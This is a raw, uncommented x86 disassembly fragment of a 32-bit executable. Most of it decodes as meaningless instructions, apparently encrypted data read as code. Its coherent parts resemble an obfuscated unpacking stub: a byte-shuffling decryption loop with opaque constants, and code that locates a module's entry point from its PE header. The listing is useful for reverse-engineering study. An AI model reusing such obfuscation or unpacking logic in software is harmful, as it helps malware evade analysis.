  40618f:	inc    edx
  406190:	push   ds
  406191:	rol    DWORD PTR [eax+0x5c],1
  406194:	inc    esi
  406195:	push   esp
  406196:	in     al,dx
  406197:	lods   al,BYTE PTR ds:[esi]
  406198:	int3   
  406199:	inc    ebx
  40619a:	xor    BYTE PTR [edx],bl
  40619c:	imul   esp,edx,0xffffffbd
  40619f:	push   ss
  4061a0:	outs   dx,BYTE PTR ds:[esi]
  4061a1:	lea    ebx,[edx+ebp*4-0x66afc24e]
  4061a8:	add    al,al
  4061aa:	pop    es
  4061ab:	scas   al,BYTE PTR es:[edi]
  4061ac:	pop    ebx
  4061ad:	inc    BYTE PTR [eax+0x3d]
  4061b0:	popa   
  4061b1:	ins    DWORD PTR es:[edi],dx
  4061b2:	cmp    edx,DWORD PTR [ebx]
  4061b4:	sahf   
  4061b5:	stos   BYTE PTR es:[edi],al
  4061b6:	les    esi,FWORD PTR [ebx-0x2f]
  4061b9:	ret    
  4061ba:	mov    dh,0xe2
  4061bc:	lea    edi,[edx+esi*1+0x3a]
  4061c0:	aaa    
  4061c1:	xchg   esp,eax
  4061c2:	aaa    
  4061c3:	or     dh,BYTE PTR [ebp+0x1c]
  4061c6:	cdq    
  4061c7:	pop    esp
  4061c8:	mov    ebp,0xb7113d38
  4061cd:	pop    dx
  4061cf:	stos   DWORD PTR es:[edi],eax
  4061d0:	sbb    BYTE PTR [esp+ecx*4+0x7d],ah
  4061d4:	cmp    al,0xa5
  4061d6:	jb     0x406189
  4061d8:	xchg   esi,eax
  4061d9:	xchg   ebp,eax
  4061da:	push   ds
  4061db:	ss call 0xddd20ce1
  4061e1:	pop    ecx
  4061e2:	inc    esi
  4061e3:	loopne 0x40619d
  4061e5:	jecxz  0x40616a
  4061e7:	mov    ds:0x2301a1e8,al
  4061ec:	or     BYTE PTR [ebx],bh
  4061ee:	jecxz  0x406255
  4061f0:	push   edx
  4061f1:	mov    ch,0x6a
  4061f3:	xchg   edi,eax
  4061f4:	mov    cl,BYTE PTR [ebx]
  4061f6:	mov    ebx,0xb2f522da
  4061fb:	ins    DWORD PTR es:[edi],dx
  4061fc:	xchg   esp,eax
  4061fd:	push   eax
  4061fe:	or     eax,0x64abdb4e
  406203:	mov    DWORD PTR [eax-0x10386d48],ecx
  406209:	mov    WORD PTR [esi+0x6a],ss
  40620c:	jo     0x406251
  40620e:	sub    BYTE PTR [ebx+0x36],dh
  406211:	mov    esi,0x4c5474a4
  406216:	dec    edx
  406217:	loop   0x406278
  406219:	fst    DWORD PTR [eax+0x3d]
  40621c:	leave  
  40621d:	sub    eax,0xeeb3d433
  406222:	hlt    
  406223:	mul    BYTE PTR [ecx]
  406225:	push   0x31
  406227:	sub    eax,0x4357c337
  40622c:	test   DWORD PTR [edx+0x27cf465e],esp
  406232:	sahf   
  406233:	in     al,0x3
  406235:	xor    ebp,eax
  406237:	xchg   dl,dh
  406239:	or     BYTE PTR [ecx+0x1a29cff0],al
  40623f:	xor    DWORD PTR [esi-0x59],0xc522002a
  406246:	repnz ins BYTE PTR es:[edi],dx
  406248:	shl    DWORD PTR [edx+0x31d09197],cl
  40624e:	dec    edi
  40624f:	rcl    edx,1
  406251:	and    edi,esp
  406253:	pop    ds
  406254:	sbb    eax,0x8c6bfc22
  406259:	pop    es
  40625a:	lea    ebp,ds:[eax]
  40625d:	adc    al,0x2f
  40625f:	mov    dl,0xd3
  406261:	shl    DWORD PTR [eax-0x4a82ba25],1
  406267:	mov    ds:0xa8439258,al
  40626c:	stos   BYTE PTR es:[edi],al
  40626d:	lods   eax,DWORD PTR ds:[esi]
  40626e:	test   dl,ch
  406270:	test   DWORD PTR [ecx+0x6fcbe22a],ebp
  406276:	xchg   ebx,eax
  406277:	stos   DWORD PTR es:[edi],eax
  406278:	aam    0x31
  40627a:	fild   WORD PTR [eax]
  40627c:	fdiv   DWORD PTR [edi]
  40627e:	cmc    
  40627f:	mov    eax,ds:0x1cbcd610
  406284:	les    ebx,FWORD PTR [ebx]
  406286:	dec    ebp
  406287:	popa   
  406288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406289:	add    BYTE PTR [edi-0x15],dh
  40628c:	xor    BYTE PTR [ebx+0x4b],bh
  40628f:	cmp    dh,BYTE PTR [esi]
  406291:	mov    ecx,0x8d18dd43
  406296:	and    BYTE PTR [esi-0x27a58fda],0xbf
  40629d:	bnd je 0x406273
  4062a0:	fwait
  4062a1:	mov    edx,0x75469d5d
  4062a6:	xor    eax,0x55c69b4
  4062ab:	xor    BYTE PTR [ebp+0x6db4d9ac],al
  4062b1:	vfmadd132sd xmm7{k6}{z},xmm5,QWORD PTR [esi]
  4062b7:	push   edi
  4062b8:	mov    cl,ch
  4062ba:	mov    eax,0xcd0ce826
  4062bf:	mov    ds:0xba4da679,al
  4062c4:	repnz arpl WORD PTR [edi],cx
  4062c7:	call   0x502ef2c1
  4062cc:	xor    eax,0x4cc328e7
  4062d1:	cmc    
  4062d2:	jle    0x40626b
  4062d4:	adc    BYTE PTR [ebp+0x36efa84c],0xbc
  4062db:	sbb    eax,0x4fc94b67
  4062e0:	xor    bl,BYTE PTR [ebp-0x3c59d15f]
  4062e6:	mov    dl,0xc3
  4062e8:	aad    0xfc
  4062ea:	fisttp WORD PTR [ebx+0x67c4f60a]
  4062f0:	add    BYTE PTR [ecx],0xf
  4062f3:	fwait
  4062f4:	adc    ch,al
  4062f6:	mov    ecx,DWORD PTR [edi+0x2d]
  4062f9:	xchg   DWORD PTR [ecx+0x57c2463b],ebp
  4062ff:	call   0x33ac4501
  406304:	cmp    DWORD PTR [ebp-0x51],esi
  406307:	push   ss
  406308:	xor    al,0x38
  40630a:	lock xchg BYTE PTR [edi+edx*4+0x49402226],bl
  406312:	pop    edi
  406313:	les    edi,FWORD PTR [ecx-0x1225abb]
  406319:	cmp    bh,BYTE PTR [esi]
  40631b:	jbe    0x406310
  40631d:	pop    ss
  40631e:	sub    eax,0x8c1683a8
  406323:	jmp    0x406311
  406325:	jae    0x40633b
  406327:	inc    eax
  406328:	mov    cl,0xbb
  40632a:	xchg   ebx,eax
  40632b:	and    eax,0xad540a0e
  406330:	add    DWORD PTR [eax-0x1c],esi
  406333:	dec    ebx
  406334:	mov    BYTE PTR ds:0x90fec585,bh
  40633a:	adc    ebp,eax
  40633c:	das    
  40633d:	mov    dl,0xd9
  40633f:	ret    
  406340:	(bad)  
  406341:	fisub  WORD PTR ds:0x586abac8
  406347:	xchg   edi,eax
  406348:	imul   esp,DWORD PTR [eax-0x6bc863eb],0x71
  40634f:	sbb    DWORD PTR [edi-0x101d1900],ebp
  406355:	jg     0x406372
  406357:	push   esi
  406358:	cmp    al,bh
  40635a:	fs aaa 
  40635c:	add    DWORD PTR [edx],ebx
  40635e:	das    
  40635f:	adc    DWORD PTR [esi-0x6fc9bc76],esp
  406365:	out    0x77,ax
  406368:	xlat   BYTE PTR ds:[ebx]
  406369:	in     eax,dx
  40636a:	jmp    0x9eba:0xb98de4b9
  406371:	and    ebx,DWORD PTR [edx-0x62b7d37a]
  406377:	ins    BYTE PTR es:[edi],dx
  406378:	add    DWORD PTR [ebp+0x55],ebx
  40637b:	test   eax,0x453980fc
  406380:	pop    eax
  406381:	aas    
  406382:	aad    0x12
  406384:	mov    ecx,0x4638e1d7
  406389:	mov    esi,0x510ea7a9
  40638e:	mov    esi,DWORD PTR [ebp+0x51]
  406391:	jns    0x406357
  406393:	dec    edi
  406394:	mov    bh,0x96
  406396:	pop    edx
  406397:	inc    ebp
  406398:	aas    
  406399:	jmp    0x406329
  40639b:	(bad)  
  40639c:	(bad)  
  40639d:	xchg   ebp,eax
  40639e:	mov    ebp,0x2d27ec73
  4063a3:	rcl    BYTE PTR [edx],0xd6
  4063a6:	shr    BYTE PTR [esi-0x4cc5b4c2],1
  4063ac:	or     BYTE PTR [eax],bl
  4063ae:	pop    esp
  4063af:	sub    cl,BYTE PTR [eax-0x58357eb0]
  4063b5:	in     eax,dx
  4063b6:	stos   DWORD PTR es:[edi],eax
  4063b7:	int3   
  4063b8:	xor    BYTE PTR [ebp+0x5ec07719],0x27
  4063bf:	in     eax,dx
  4063c0:	lock out dx,eax
  4063c2:	mov    cl,0xa8
  4063c4:	jge    0x4063c6
  4063c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c7:	adc    ebp,DWORD PTR [eax-0x6e]
  4063ca:	icebp  
  4063cb:	add    DWORD PTR [esi-0x53],ebx
  4063ce:	not    DWORD PTR [ebp+0x29]
  4063d1:	mov    al,0x73
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	mov    esp,0xa5649c0e
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064da
  40646b:	pop    ebp
  40646c:	sahf   
  40646d:	into   
  40646e:	cmp    edx,DWORD PTR [ebx+eiz*2-0x2ee641f]
  406475:	mov    dh,bl
  406477:	rcl    DWORD PTR [ecx+0xf],0x92
  40647b:	in     al,0xf0
  40647d:	ss mov bl,0x98
  406480:	dec    esi
  406481:	inc    ebx
  406482:	xor    DWORD PTR [edi+0x16],ebx
  406485:	test   BYTE PTR [esi],0x4c
  406488:	push   ds
  406489:	push   cs
  40648a:	or     eax,0x9a861e5d
  40648f:	outs   dx,BYTE PTR ds:[esi]
  406490:	addr16 iret 
  406492:	mov    eax,ds:0xea644982
  406497:	push   esi
  406498:	neg    DWORD PTR [ebx-0x54c6a599]
  40649e:	jb     0x406502
  4064a0:	and    bl,bh
  4064a2:	repnz xor ebx,eax
  4064a5:	xchg   ebx,eax
  4064a6:	lock mov DWORD PTR [ebx+0x5ed02244],edx
  4064ad:	jns    0x406460
  4064af:	cdq    
  4064b0:	mov    esi,0xd088cd80
  4064b5:	(bad)  
  4064b6:	sbb    ah,dh
  4064b8:	mov    ds:0xd482a435,al
  4064bd:	mov    dl,0x33
  4064bf:	cmp    BYTE PTR [eax],0xf2
  4064c2:	or     eax,0x68b13824
  4064c7:	push   esi
  4064c8:	xor    al,0x89
  4064ca:	into   
  4064cb:	(bad)  
  4064cc:	jmp    0xbe42919d
  4064d1:	mov    ah,0x6c
  4064d3:	shl    DWORD PTR [esi-0x7],1
  4064d6:	pop    edx
  4064d7:	sub    DWORD PTR [ebx+0x621dae7f],edi
  4064dd:	fsub   QWORD PTR [esi-0x72]
  4064e0:	push   0x1010f1e6
  4064e5:	leave  
  4064e6:	jae    0x4064f2
  4064e8:	mov    ebp,0xa41da716
  4064ed:	pop    ds
  4064ee:	add    dh,dl
  4064f0:	mov    cl,0xa8
  4064f2:	cld    
  4064f3:	sbb    eax,0x59f2cbd0
  4064f8:	dec    ebp
  4064f9:	test   eax,0x6b239c62
  4064fe:	(bad)  
  4064ff:	js     0x406538
  406501:	lods   al,BYTE PTR ds:[esi]
  406502:	shl    cl,0x28
  406505:	jge    0x406543
  406507:	jne    0x4064c2
  406509:	pop    ebp
  40650a:	xchg   ebp,eax
  40650b:	xor    DWORD PTR [ebp-0x4b],0x4c
  40650f:	dec    ecx
  406510:	inc    ebp
  406511:	aas    
  406512:	fistp  DWORD PTR [eax-0x3c3857bd]
  406518:	lds    edi,FWORD PTR [ebx-0x77]
  40651b:	dec    edx
  40651c:	mov    dl,0xa2
  40651e:	pop    es
  40651f:	push   edi
  406520:	out    0x27,eax
  406522:	test   eax,0x340c79b0
  406527:	lock (bad) 
  406529:	retf   
  40652a:	sbb    DWORD PTR [ebp-0x6],edi
  40652d:	int3   
  40652e:	push   ebx
  40652f:	shr    BYTE PTR [edx+0x6e4b67c1],0xae
  406536:	ja     0x4064f5
  406538:	mov    ecx,fs
  40653a:	mov    eax,0x4c7e50f1
  40653f:	mov    ebp,0x4618732d
  406544:	popa   
  406545:	scas   eax,DWORD PTR es:[edi]
  406546:	cmova  ebp,ecx
  406549:	jp     0x406561
  40654b:	add    esi,DWORD PTR [edi-0x71321b4f]
  406551:	das    
  406552:	xor    al,0xa0
  406554:	neg    DWORD PTR [eax]
  406556:	pop    ecx
  406557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406558:	mov    esp,0x6a66b94
  40655d:	add    esi,eax
  40655f:	pop    ecx
  406560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406561:	pusha  
  406562:	icebp  
  406563:	xchg   DWORD PTR [ebx-0x4a1d1d1c],ebp
  406569:	or     al,0x3f
  40656b:	dec    ebp
  40656c:	dec    eax
  40656d:	jle    0x406586
  40656f:	fs adc eax,0xce360fa7
  406575:	or     eax,0x1c841df3
  40657a:	sbb    edi,ecx
  40657c:	mov    dh,0x37
  40657e:	mov    dl,0xc6
  406580:	xchg   esp,eax
  406581:	js     0x406547
  406583:	jl     0x4065f4
  406585:	mov    BYTE PTR [esp+esi*2+0x30],dh
  406589:	stos   BYTE PTR es:[edi],al
  40658a:	faddp  st(1),st
  40658c:	jecxz  0x4065f8
  40658e:	mov    eax,0xc5ee0532
  406593:	inc    esp
  406594:	fcom   st(7)
  406596:	stc    
  406597:	adc    eax,0x60866812
  40659c:	cs xchg ecx,eax
  40659e:	xchg   ecx,eax
  40659f:	mov    bh,0xf6
  4065a1:	or     eax,0xe4df9d18
  4065a6:	mov    edx,0xbaa62062
  4065ac:	mov    WORD PTR [edx+0x6e],cs
  4065af:	(bad)  
  4065b0:	sub    DWORD PTR [ebx],ebx
  4065b2:	test   eax,0x66465e8c
  4065b7:	sub    BYTE PTR [ecx],ch
  4065b9:	popf   
  4065ba:	inc    edi
  4065bb:	jl     0x406606
  4065bd:	push   ds
  4065be:	popa   
  4065bf:	loope  0x40663b
  4065c1:	pop    ebx
  4065c2:	rol    BYTE PTR [edi-0x56],1
  4065c5:	aaa    
  4065c6:	sub    esi,DWORD PTR [esi-0x3e]
  4065c9:	(bad)  
  4065cb:	and    eax,0x23f90e23
  4065d0:	test   BYTE PTR [ebx],ah
  4065d2:	mov    ah,0xca
  4065d4:	mov    DWORD PTR [ecx-0x60],edi
  4065d7:	dec    ecx
  4065d8:	stos   DWORD PTR es:[edi],eax
  4065d9:	xchg   ecx,eax
  4065da:	outs   dx,DWORD PTR ds:[esi]
  4065db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065dc:	xchg   ebp,eax
  4065dd:	cmp    eax,0x4f084214
  4065e2:	xor    eax,0xc3baaf22
  4065e7:	fbstp  TBYTE PTR [ebx-0x23]
  4065ea:	(bad)  
  4065eb:	shl    DWORD PTR [esi+0x40],cl
  4065ee:	scas   eax,DWORD PTR es:[edi]
  4065ef:	bound  eax,QWORD PTR [esi+0x19]
  4065f2:	jno    0x406597
  4065f4:	mov    al,ds:0x53827356
  4065f9:	xchg   esp,eax
  4065fa:	and    edi,DWORD PTR [esi]
  4065fc:	jp     0x40666b
  4065fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065ff:	jbe    0x406663
  406601:	in     al,dx
  406602:	int3   
  406603:	icebp  
  406604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406605:	mov    esi,0x7285a93a
  40660a:	out    dx,al
  40660b:	popa   
  40660c:	adc    eax,0xab9ac05f
  406611:	or     edx,edx
  406613:	mov    eax,0xab8a22e0
  406618:	stc    
  406619:	push   cs
  40661a:	ins    BYTE PTR es:[edi],dx
  40661b:	sar    BYTE PTR [esi+0x5141a50d],cl
  406621:	mov    esi,0xf789fd04
  406626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406627:	ins    BYTE PTR es:[edi],dx
  406628:	loope  0x4066a6
  40662a:	jnp    0x4065d1
  40662c:	gs fs sbb esi,eax
  406630:	sub    edx,DWORD PTR [edi+0x6305896]
  406636:	test   eax,0x5104945d
  40663b:	fistp  QWORD PTR [ebp+0x4fb58d6e]
  406641:	popa   
  406642:	nop
  406643:	adc    al,0xf4
  406645:	or     DWORD PTR [edx+0x5b],edx
  406648:	push   ds
  406649:	jle    0x40663f
  40664b:	adc    ah,BYTE PTR [ecx+0x46]
  40664e:	mov    dh,0xf5
  406650:	dec    ebx
  406651:	mov    ebx,0xcbb14ac5
  406656:	pop    esi
  406657:	mov    ebp,0xf6090556
  40665c:	shl    DWORD PTR [eax],cl
  40665e:	xor    DWORD PTR [ecx+0x64],0xffffffe6
  406662:	jns    0x4066dc
  406664:	inc    ecx
  406665:	or     ebp,ebx
  406667:	mov    bl,0x53
  406669:	fimul  DWORD PTR [edx+eiz*4]
  40666c:	pop    ds
  40666d:	xchg   ebp,eax
  40666e:	in     al,dx
  40666f:	test   bl,bh
  406671:	lods   eax,DWORD PTR ds:[esi]
  406672:	xor    eax,0x856680f
  406677:	stc    
  406678:	pop    edx
  406679:	enter  0x1826,0x4c
  40667d:	xor    DWORD PTR [edi],esp
  40667f:	(bad)  
  406680:	sbb    ah,dl
  406682:	lock loopne 0x4066de
  406685:	inc    esi
  406686:	stos   DWORD PTR es:[edi],eax
  406687:	js     0x406656
  406689:	(bad)  
  40668b:	jae    0x40670b
  40668d:	sbb    al,0x8d
  40668f:	mov    ss,esp
  406691:	xchg   esi,eax
  406692:	fnstsw WORD PTR [edx+0x1fa57ca7]
  406698:	test   BYTE PTR [esi],al
  40669a:	stc    
  40669b:	test   bl,0x9d
  40669e:	add    bh,al
  4066a0:	jmp    0xaf0f:0xa00de0d8
  4066a7:	enter  0x7098,0x1e
  4066ab:	mov    ah,0xc7
  4066ad:	xor    eax,ebp
  4066af:	out    0xf4,eax
  4066b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b2:	pop    ds
  4066b3:	rol    BYTE PTR [edx-0x618da43],1
  4066b9:	mov    ebx,0xeb49811d
  4066be:	dec    ebp
  4066bf:	pop    eax
  4066c0:	mul    al
  4066c2:	dec    ebp
  4066c3:	cwde   
  4066c4:	jnp    0x406648
  4066c6:	mov    al,0xf2
  4066c8:	popf   
  4066c9:	cwde   
  4066ca:	nop
  4066cb:	jne    0x4066cb
  4066cd:	mov    dh,dh
  4066cf:	lahf   
  4066d0:	dec    esp
  4066d1:	daa    
  4066d2:	ds (bad) 
  4066d4:	js     0x4066e9
  4066d6:	or     al,BYTE PTR [ecx+0x53]
  4066d9:	inc    esi
  4066da:	call   0x4752c6e8
  4066df:	lahf   
  4066e0:	push   ebx
  4066e1:	add    DWORD PTR [ebp+0x7f],ebx
  4066e4:	scas   eax,DWORD PTR es:[edi]
  4066e5:	icebp  
  4066e6:	pop    ds
  4066e7:	jbe    0x4066f2
  4066e9:	popf   
  4066ea:	and    eax,0x5a435a16
  4066ef:	cwde   
  4066f0:	and    eax,0xf2ed0145
  4066f5:	add    al,0x1c
  4066f7:	sub    dl,al
  4066f9:	stc    
  4066fa:	test   BYTE PTR [ebx],bh
  4066fc:	je     0x4066bc
  4066fe:	daa    
  4066ff:	fwait
  406700:	nop
  406701:	popf   
  406702:	ins    BYTE PTR es:[edi],dx
  406703:	arpl   WORD PTR [ecx],ax
  406705:	push   ecx
  406706:	shl    cl,cl
  406708:	cmp    al,BYTE PTR [edi+0x3a]
  40670b:	int    0xac
  40670d:	sub    dh,BYTE PTR [esp+edi*2-0x6e77db71]
  406714:	mov    eax,ds:0xf7146c59
  406719:	scas   al,BYTE PTR es:[edi]
  40671a:	xor    DWORD PTR [eax+0x25],edi
  40671d:	add    eax,0xc2587c59
  406722:	aas    
  406723:	mov    WORD PTR [ebx+0x52ef7370],ss
  406729:	mov    ah,0x8d
  40672b:	inc    ebp
  40672c:	sbb    ch,dl
  40672e:	fs in  al,dx
  406730:	fidiv  DWORD PTR [eax-0x37a368b2]
  406736:	jne    0x406724
  406738:	adc    edx,DWORD PTR [edx+0x33]
  40673b:	pop    esi
  40673c:	adc    ecx,DWORD PTR es:[esi-0x293a723a]
  406743:	adc    BYTE PTR ds:0x3645ffd5,0x6
  40674a:	dec    esi
  40674b:	lea    edx,[ebx+edx*1]
  40674e:	jno    0x406796
  406750:	jnp    0x4067c0
  406752:	ret    0x1efd
  406755:	(bad)  
  406756:	push   edx
  406757:	push   ecx
  406758:	mov    ds,WORD PTR [edx-0x42]
  40675b:	in     al,dx
  40675c:	outs   dx,BYTE PTR ds:[esi]
  40675d:	out    dx,al
  40675e:	shl    ch,1
  406760:	mov    DWORD PTR [edi],ebp
  406762:	inc    ebx
  406763:	and    ah,ch
  406765:	xchg   edx,eax
  406766:	mov    ds:0xd485f77f,eax
  40676b:	push   edi
  40676c:	lahf   
  40676d:	outs   dx,BYTE PTR ds:[esi]
  40676e:	lods   al,BYTE PTR ds:[esi]
  40676f:	or     eax,0xab1795b5
  406774:	pop    DWORD PTR [ecx+0xc]
  406777:	adc    BYTE PTR [edx+edi*4-0x78],cl
  40677b:	xchg   ecx,eax
  40677c:	inc    ebp
  40677d:	not    cl
  40677f:	xor    ch,bl
  406781:	in     al,dx
  406782:	xor    DWORD PTR [ebx],edi
  406784:	pop    ebp
  406785:	in     eax,dx
  406786:	cld    
  406787:	fdivr  QWORD PTR [ebp+0x3bc4c804]
  40678d:	sbb    DWORD PTR [ebx+0x40],esi
  406790:	(bad)  
  406791:	jne    0x406739
  406793:	jbe    0x406776
  406795:	jge    0x40673d
  406797:	iret   
  406798:	fistp  WORD PTR [edx]
  40679a:	xchg   DWORD PTR [edi],ecx
  40679c:	xchg   edx,eax
  40679d:	in     al,0x29
  40679f:	mov    fs,eax
  4067a1:	mov    ch,0x3
  4067a3:	jmp    0x3f8:0x3309e19d
  4067aa:	jge    0x406798
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x636491c7],ecx
  4069de:	stc    
  4069df:	retf   
